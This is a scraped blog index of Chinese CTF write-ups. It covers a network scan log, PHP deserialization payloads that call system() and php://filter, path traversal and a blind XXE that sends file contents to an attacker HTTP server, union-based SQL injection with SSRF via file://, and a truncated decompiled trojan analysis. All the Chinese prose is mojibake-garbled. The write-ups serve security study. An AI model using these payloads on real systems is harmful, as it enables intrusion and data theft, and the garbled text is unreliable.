[*] ç›®æ ‡ 172.22.10.88 å­˜æ´» (ICMP)[4.9s] å­˜æ´»ä¸»æœºæ•°é‡: 4[4.9s] æœ‰æ•ˆç«¯å£æ•°é‡: 233[4.9s] [*] ç«¯å£å¼€æ”¾ 172.22.10.22:6379[4.9s] [*] ç«¯å£å¼€æ”¾ 172.22.10.22:80[4.9s] [*] ç«¯å£å¼€æ”¾ 172.22.10.22:3306[4.9s] [*] ç«¯å£å¼€æ”¾ 172.22.10.22:8081[4.9s] [*] ç«¯å£å¼€æ”¾ 172.22.10.22:8080[4.9s] [*] ç«¯å£å¼€æ”¾ 172.22.10.17:22[4.9s] [*] ç«¯å£å¼€æ”¾ 172.22.10.88:21[4.9s] [*] ç«¯å£å¼€æ”¾ 172.22.10.88:80[4.9s] [*] ç«¯å£å¼€æ”¾ 172.22.10.88:445[4.9s] [*] ç«¯å£å¼€æ”¾ 172.22.10.88:139[4.9s] [*] ç«¯å£å¼€æ”¾ 172.22.10.88:135[7.9s] æ‰«æå®Œæˆ, å‘ç° 11 ä¸ªå¼€æ”¾ç«¯å£[7.9s] å­˜æ´»ç«¯å£æ•°é‡: 11[7.9s] å¼€å§‹æ¼æ´æ‰«æ[7.9s] [*] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.10.88ä¸»æœºå: web02å‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.10.88[7.9s] [*] ç½‘ç«™æ ‡é¢˜ http://172.22.10.22 çŠ¶æ€ç :200 é•¿åº¦:14323 æ ‡é¢˜:FinancePro ERPç³»ç»Ÿ[8.0s] [+] NetBios 172.22.10.88 WORKGROUP\\WEB02 [8.0s] [*] ç½‘ç«™æ ‡é¢˜ http://172.22.10.88 çŠ¶æ€ç :403 é•¿åº¦:199 æ ‡é¢˜:403 Forbidden[8.0s] POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª[8.1s] [+] FTPæœåŠ¡ 172.22.10.88:21 åŒ¿åç™»å½•æˆåŠŸ![8.1s] [*] ç½‘ç«™æ ‡é¢˜ http://172.22.10.22:8080 çŠ¶æ€ç :404 é•¿åº¦:682 æ ‡é¢˜:HTTP Status 404 â€“ Not Found[8.1s] [*] ç½‘ç«™æ ‡é¢˜ http://172.22.10.22:8081 çŠ¶æ€ç :200 é•¿åº¦:1766 æ ‡é¢˜:&quot;&quot;[36.6s] æ‰«æå·²å®Œæˆ: 18/18","link":"/2025/12/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFinance--%E5%A4%96%E7%BD%91%E6%89%93%E9%9D%B6/"},{"title":"","text":"ç½‘é¼æ¯ 2020 æœ±é›€ç»„â€“phpweb è¿™ä¸ªå…ˆæ”¾å¾¡å‰‘æ‰«ä¸€ä¸‹ï¼Œæ²¡å‡ºè´§ç„¶åè§‚å¯Ÿåˆ°å®ƒæ˜¯ä¸€ç›´åˆ·æ–°çš„ï¼Œæˆ‘ä»¬ç”¨bpæŠ“ä¸€ä¸‹åŒ… è¿™é‡Œçœ‹åˆ°è¯·æ±‚ä¼ äº†ä¸€ä¸ªfuncå’ŒpfuncçŒœæµ‹æ˜¯function,påº”è¯¥æ˜¯payloadï¼ˆçŒœçš„ï¼‰ 1func=file_get_contents&amp;p=index.php ä¼ è¿‡å»å¾—åˆ°å¦‚ä¸‹ä»£ç  123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); } } ?&gt; å…ˆç¦ç”¨äº†ä¸€å¤§å †å‡½æ•°å¾—åˆ°æºç ä»¥åæ‰çŸ¥é“åŸæ¥æ˜¯call_user_func()å‡½æ•°ï¼Œè¿˜æ˜¯è§å¾—å°‘äº†ï¼Œå¤§ä½¬ä¼°è®¡ç›´æ¥èƒ½çœ‹å‡ºæ¥æ˜¯è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘è¿˜è¦é çŒœã€‚ 1$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); è¿™é‡Œé‚£ä¹ˆå¤šå‡½æ•°è¢«ç¦äº†ï¼Œä¸»è¦è¿˜æ˜¯ç¦äº†systemæ¯”è¾ƒéš¾å—ï¼Œä½†æ˜¯é—®é¢˜ä¸å¤§ï¼Œæ¯•ç«Ÿæ²¡æœ‰ç¦file_get_contentsã€catä»¥åŠserializeã€‚ è¿™é‡Œserializeæ‰æ˜¯é‡ç‚¹ï¼ˆæ•²é»‘æ¿ï¼ï¼‰ï¼Œæ¯•ç«Ÿæºç é‡Œç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªTestç±»ï¼š 123456789class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }} ç„¶åç®€å•æ˜äº†æ„é€ payload: 1234567891011121314151617181920&lt;?php class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $a = new Test(); // $a-&gt;p = 'ls ../../../'; ==&gt; O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:12:&quot;ls ../../../&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} // $a -&gt; p = &quot;find / -name 'flag*'&quot;; â‡’ O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:20:&quot;find / -name 'flag*'&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} $a -&gt; p = 'cat /tmp/flagoefiu4r93'; // ==&gt; O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} $a -&gt; func = 'system'; echo (serialize($a)); ?&gt;","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84--phpweb/"},{"title":"","text":"ç½‘é¼æ¯ 2020 é’é¾™ç»„â€“AreUSerialz é¢˜ç›®ç»™äº†æºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); } } function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } åˆ†æä¸€ä¸‹GETæ–¹å¼ä¼ å…¥åºåˆ—åŒ–çš„strå­—ç¬¦ä¸²ï¼Œstrå­—ç¬¦ä¸²ä¸­æ¯ä¸€ä¸ªå­—ç¬¦çš„ASCIIèŒƒå›´åœ¨32åˆ°125ä¹‹é—´ï¼Œç„¶åå¯¹å…¶ååºåˆ—åŒ–åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨__destructææ„æ–¹æ³• 1234567function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); } å¦‚æœop===&quot;2&quot; ï¼Œå°†å…¶èµ‹ä¸ºâ€1â€ï¼ŒåŒæ—¶contentèµ‹ä¸ºç©ºï¼Œè¿›å…¥processå‡½æ•°ï¼Œéœ€è¦æ³¨æ„åˆ°çš„åœ°æ–¹æ˜¯ï¼Œè¿™é‡Œopä¸â€2â€æ¯”è¾ƒçš„æ—¶å€™æ˜¯å¼ºç±»å‹æ¯”è¾ƒ 12345678910public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); }} è¿›å…¥processå‡½æ•°åï¼Œå¦‚æœop==&quot;1&quot; é‚£ä¹ˆè¿›å…¥writeå‡½æ•°ï¼Œè‹¥op==&quot;2&quot; ,åˆ™è¿›å…¥writeå‡½æ•°ï¼Œå¦åˆ™è¾“å‡ºæŠ¥é”™ï¼Œå¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œopä¸å­—ç¬¦ä¸²çš„æ¯”è¾ƒå˜æˆäº†è‹¥æ¯”è¾ƒç±»å‹==æ‰€ä»¥æˆ‘ä»¬ä¹‹å“¦å‘€å“¦ä»¤op==2 ,è¿™é‡Œ2æ˜¯æ•´æ•°int.å½“op=2æ—¶,op===&quot;2&quot; ä¸ºflaseop==&quot;2&quot; ä¸ºtrue,æ¥ç€è¿›å…¥readå‡½æ•° 1234567private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res;} filenameæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæ¥ç€ä½¿ç”¨file_get_contentså‡½æ•°è¯»å–æ–‡ä»¶ï¼Œæˆ‘ä»¬æ­¤å¤„å€ŸåŠ©php://filterä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œè·å–åˆ°æ–‡ä»¶åä½¿ç”¨outputå‡½æ•°è¾“å‡º 1234private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s;} æ•´ä¸ªåˆ©ç”¨æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œfilename,$contentä¸‰ä¸ªå˜é‡æƒé™éƒ½æ˜¯protectedï¼Œè€Œprotectedæƒé™çš„å˜é‡åœ¨åºåˆ—åŒ–çš„æ—¶ä¼šæœ‰%00*%00å­—ç¬¦ï¼Œ%00å­—ç¬¦çš„ASCIIç ä¸º0ï¼Œå°±æ— æ³•é€šè¿‡ä¸Šé¢çš„is_validå‡½æ•°æ ¡éªŒã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?php class FileHandler { protected $op=2; protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; // $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; // $this-&gt;process(); } } $A=new FileHandler(); $B=serialize($A); echo $B; è¾“å‡º åœ¨è¿™é‡Œæœ‰å‡ ç§ç»•è¿‡çš„æ–¹å¼ï¼Œç®€å•çš„ä¸€ç§æ˜¯ï¼šphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°åºåˆ—åŒ–çš„æ—¶å€™å°†å±æ€§æ”¹ä¸ºpublicè¿›è¡Œç»•è¿‡å³å¯ å³: 123public $op=2;public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;public $content; ç°åœ¨å¾—åˆ°çš„ç»“æœå°±æ²¡æœ‰%00å­—ç¬¦äº† 1O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;} å¾—åˆ°payload 1http://82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;}","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--AreUSerialz/"},{"title":"","text":"ç½‘é¼æ¯ 2020 é’é¾™ç»„â€“filejava å…ˆä¸Šä¼ éšä¾¿ä¸€ä¸ªæ–‡ä»¶ï¼Œç‚¹ä¸‹è½½æŠ“åŒ… çœ‹åˆ°?file çœ‹åˆ°æœ‰ä¸€ä¸ªè·¯å¾„ï¼Œé‡Œé¢æœ‰WEB-INFï¼Œé¢˜ç›®æç¤ºä¸javaæœ‰å…³ï¼Œé‚£åº”è¯¥æ˜¯web.xmlæ–‡ä»¶æ³„éœ²ï¼Œå°è¯•è¯»å– Java Webç›®å½•ç»“æ„ WEB-INF/web.xmlï¼šæ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œæ˜ å°„Servletç±»è·¯å¾„ã€‚WEB-INF/classes/ï¼šå­˜æ”¾ç¼–è¯‘åçš„Javaç±»æ–‡ä»¶ã€‚åˆ©ç”¨è·¯å¾„ç©¿è¶Šï¼ˆ../../ï¼‰å¯è¯»å–æ•æ„Ÿæ–‡ä»¶ã€‚XXEæ¼æ´åŸç† XMLè§£æå™¨æœªç¦ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œå¯é€šè¿‡file://åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæˆ–é€šè¿‡HTTPè¯·æ±‚å¤–å¸¦æ•°æ®ï¼ˆBlind XXEï¼‰ã€‚Apache POI 3.10ç‰ˆæœ¬é»˜è®¤æœªç¦ç”¨å¤–éƒ¨å®ä½“ï¼Œå¯¼è‡´æ¼æ´ã€‚Excelæ–‡ä»¶ç»“æ„ XLSXä¸ºZIPå‹ç¼©åŒ…ï¼Œå†…å«XMLæ–‡ä»¶ï¼Œä¿®æ”¹[Content_Types].xmlå¯æ³¨å…¥æ¶æ„å®ä½“ã€‚æ¼æ´åˆ©ç”¨é“¾è®¾è®¡ æ–‡ä»¶ä¸Šä¼  â†’ è§¦å‘XXE â†’ å¤–å¸¦æ•°æ® â†’ è·å–Flagã€‚ 1DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml 1DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class ä¸‹è½½ä¸‹æ¥ä¸€ä¸ªclassæ–‡ä»¶åç¼–è¯‘ä¸€ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124package cn.abc.servlet; import java.io.File; import java.io.FileInputStream; import java.io.IOException; import java.net.URLEncoder; import javax.servlet.ServletException; import javax.servlet.ServletOutputStream; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; /* loaded from: _.._.._.._.._.._.._.._.._usr_local_tomcat_webapps_ROOT_WEB-INF_classes_cn_abc_servlet_DownloadServlet.class */ public class DownloadServlet extends HttpServlet { private static final long serialVersionUID = 1; protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request, response); } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String fileName = new String(request.getParameter(&quot;filename&quot;).getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;); System.out.println(&quot;filename=&quot; + fileName); if (fileName != null &amp;&amp; fileName.toLowerCase().contains(&quot;flag&quot;)) { request.setAttribute(&quot;message&quot;, &quot;ç¦æ­¢è¯»å–&quot;); request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response); return; } String fileSaveRootPath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;); String path = findFileSavePathByFileName(fileName, fileSaveRootPath); File file = new File(path + &quot;/&quot; + fileName); if (!file.exists()) { request.setAttribute(&quot;message&quot;, &quot;æ‚¨è¦ä¸‹è½½çš„èµ„æºå·²è¢«åˆ é™¤!&quot;); request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response); return; } String realname = fileName.substring(fileName.indexOf(&quot;_&quot;) + 1); response.setHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + URLEncoder.encode(realname, &quot;UTF-8&quot;)); FileInputStream in = new FileInputStream(path + &quot;/&quot; + fileName); ServletOutputStream out = response.getOutputStream(); byte[] buffer = new byte[1024]; while (true) { int len = in.read(buffer); if (len &gt; 0) { out.write(buffer, 0, len); } else { in.close(); out.close(); return; } } } public String findFileSavePathByFileName(String filename, String saveRootPath) { int hashCode = filename.hashCode(); int dir1 = hashCode &amp; 15; int dir2 = (hashCode &amp; 240) &gt;&gt; 4; String dir = saveRootPath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2; File file = new File(dir); if (!file.exists()) { file.mkdirs(); } return dir; } } 1zip -r ./payload.xlsx ./excel-123456 1234python -m SimpleHTTPServer 4560netstat -tulnp | grep 4560kill pid evil.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://10.88.15.58:4560/%file;'&gt;&quot;&gt; æ˜¯æœåŠ¡å™¨ncçš„ç«¯å£ å¯åŠ¨httpæœåŠ¡åœ¨xlsxæ–‡ä»¶çš„ 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://10.88.15.58:4560/evil.dtd&quot;&gt;%remote;%int;%send;]&gt; 1234python -m SimpleHTTPServer 4560python -m http.server 4560","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--filejava/"},{"title":"","text":"ç½‘é¼æ¯ 2018â€“Fakebook æ‰«åˆ°ç›®å½•robots.txt è®¿é—®/user.php.bak 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo{ public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); }} è¿™é‡Œçœ‹åˆ°view.phpè·¯å¾„ ç„¶åå¯ä»¥å¤§è‡´åˆ¤æ–­flagåº”è¯¥åœ¨ 1/var/www/html/flag.php è¿™é‡Œå‘ç°sqlæ³¨å…¥ 1?no=1 and 1=1 åˆ¤æ–­åˆ—æ•°4åˆ— 1?no=1 order by 4--+ å›æ˜¾ä½ä¸º2 1?no=-1 union/**/select 1,2,3,4--+ æŸ¥æ•°æ®åº“ä¸ºfakebook 1?no=-1 union/**/select 1,group_concat(schema_name),3,4 from information_schema.schemata--+ å¾—åˆ°ä»¥ä¸‹æ•°æ®åº“ fakebook,information_schema,mysql,performance_schema,test çˆ†è¡¨ 1?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;--+ å¾—åˆ°è¡¨åusers çˆ†å­—æ®µ 1?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;--+ å¾—åˆ°å­—æ®µæ˜¯no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS æœ€åæŸ¥æ•°æ® 1?no=-1 union/**/select 1,concat(no,&quot;\\n&quot;,username,&quot;\\n&quot;,passwd,&quot;\\n&quot;,data),3,4 from users--+ å¾—åˆ°å¦‚ä¸‹æ•°æ® 11 admin c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;} dataå­—æ®µä¸ºæˆ‘ä»¬åˆšjoinæ³¨å†Œçš„æ•°æ®åºåˆ—åŒ–çš„å½¢å¼ æ³¨æ„åˆ°æºä»£ç æ˜¯iframeæ ¼å¼å‰é¢çš„åˆ†æå¯çŸ¥flag.phpçš„è·¯å¾„ï¼Œssrfå¯ä»¥ä¼ªåè®®file://,æŠŠåºåˆ—åŒ–å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°è¾“å…¥æµ‹è¯•ï¼Œå°†blogå€¼æ”¹ä¸ºç™¾åº¦çš„ç½‘å€ 1no=-1 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:22:&quot;https://www.baidu.com/&quot;;}' è¿™é‡Œæˆ‘æ²¡æˆåŠŸï¼Œæš‚æ—¶ä¸çŸ¥é“ä»€ä¹ˆåŸå›  è¿™è¾¹ç”±äºåŸæœ¬çš„https://www.baodu.com/æ˜¯22ï¼Œæ‰€ä»¥æ„é€ payloadæ—¶è¿™è¾¹æ”¹æˆfile:///var/www/html/flag.phpè¦æ›´æ”¹é•¿åº¦ä¸º29 1?no=-1 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}' è§£ç å¾—åˆ°flag","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018--Fakebook/"},{"title":"","text":"é“¶ç‹æœ¨é©¬æ ·æœ¬æ·±åº¦åˆ†æä¸åé—¨åŸŸåæº¯æº ç”±äºåˆ¶åšC2å·¥å…·çš„é»‘å®¢ç•™ä¸‹äº†åé—¨ï¼Œæ‰€ä»¥è¿™ä¸ªæœ¨é©¬æ˜¯æœ‰åé—¨çš„ï¼Œä½ èƒ½æ‰¾åˆ°å®ƒçš„åé—¨å— WriteUpwmainå‡½æ•° 123456789101112131415161718__int64 wmain(){ HWND hWnd; // rax DWORD idThread; // eax SetUnhandledExceptionFilter(TopLevelExceptionFilter); hWnd = GetConsoleWindow(); ShowWindow(hWnd, 0); idThread = GetCurrentThreadId(); PostThreadMessageA(idThread, 0, 0, 0); GetInputState(); sub_140008750(); hObject = CreateThread(0, 0, sub_14000A440, 0, 0, 0); WaitForSingleObject(hObject, 0xFFFFFFFF); CloseHandle(hObject); Sleep(0x12Cu); return 0;} å…ˆçœ‹sub_140008750å‡½æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739#sub_140008750å‡½æ•°int sub_140008750(){ _UNKNOWN **v0; // rax __int64 v1; // rbx int v2; // eax int v3; // r9d __int64 v4; // rdx int v5; // r10d __int64 i; // r8 int v7; // ecx __int64 v8; // rbx int v9; // eax int v10; // r9d __int64 v11; // rdx int v12; // r10d __int64 j; // r8 int v14; // ecx __int64 v15; // rbx int v16; // eax int v17; // r9d __int64 v18; // rdx int v19; // r10d __int64 k; // r8 int v21; // ecx __int64 v22; // rbx int v23; // eax int v24; // r9d __int64 v25; // rdx int v26; // r10d __int64 m; // r8 int v28; // ecx __int64 v29; // rbx int v30; // eax int v31; // r9d __int64 v32; // rdx int v33; // r10d __int64 n; // r8 int v35; // ecx __int64 v36; // rbx int v37; // eax int v38; // r9d __int64 v39; // rdx int v40; // r10d __int64 ii; // r8 int v42; // ecx __int64 v43; // rbx int v44; // eax int v45; // r9d __int64 v46; // rdx int v47; // r10d __int64 jj; // r8 int v49; // ecx __int64 v50; // rbx int v51; // eax int v52; // r9d __int64 v53; // rdx int v54; // r10d __int64 kk; // r8 int v56; // ecx __int64 v57; // rbx int v58; // eax int v59; // r9d __int64 v60; // rdx int v61; // r10d __int64 mm; // r8 int v63; // ecx __int64 v64; // rbx int v65; // eax int v66; // r9d __int64 v67; // rdx int v68; // r10d __int64 nn; // r8 int v70; // ecx __int64 v71; // 